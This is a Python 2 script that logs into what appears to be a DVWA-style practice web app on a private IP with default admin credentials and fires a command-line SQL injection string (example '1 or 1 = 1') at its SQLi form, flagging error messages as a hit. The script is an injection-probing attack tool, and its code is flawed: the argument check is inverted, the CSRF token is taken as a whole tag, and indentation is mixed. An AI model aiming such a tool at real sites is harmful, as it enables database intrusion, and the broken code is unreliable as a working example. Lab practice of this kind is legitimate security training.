import sys
import re
import requests
from requests import session
import mechanize
import cookielib
import urllib
import urllib2

from bs4 import BeautifulSoup
s=requests.Session()
username="admin"
password="password"
login_url="http://192.168.20.130/login.php"
target = "http://192.168.20.130/vulnerabilities/sqli/" #% (inj_str)
headers = {'User-Agent': 'Mozilla/5.0'}

response = requests.get(login_url, headers=headers, verify=False)
s.get(login_url)

soup = BeautifulSoup(s.get(login_url).text)
csrf_token = soup.find(name="user_token")
print(csrf_token)

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
login_data = urllib.urlencode({
"username":"%s" %(username),
"password":"%s" %(password),
"login":"login",
"user_token":"%s" %(csrf_token)
})
opener.open(login_url, login_data)



def sqli(inj_str):

	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.set_cookiejar(cj)
	br.open(target)
	br.select_form(nr=0)
   	for f in br.forms():
		print f
	br.select_form(nr=0)
	br.form['id'] = "%s" % (inj_str)
	br.form['submit'] = "submit"
	req = br.submit()
	s = BeautifulSoup(req.text, 'lxml')
	print "Response Headers:"
	print br.headers # 
	print
	print "Response Content:"
	print s.text #print soup text (pretty response)
	print 
	error = re.search("There was an error", s.text) # search for "Invalid argument" in soups text
	if error:
		print "Errors found in response. Possible SQL injection found"
	else:
        	print "No errors found"
        
def main():
    if len(sys.argv) != 1:
        print "(+) usage: %s <injection_string>" % sys.argv[0]
        print '''(+) eg: %s  "1 or 1 = 1"'''  %sys.argv[0]
    injection_string = sys.argv[1]

    sqli(injection_string)

if __name__ == "__main__": #fancy trick to check against a definte variable to run our function main
    main()
#----
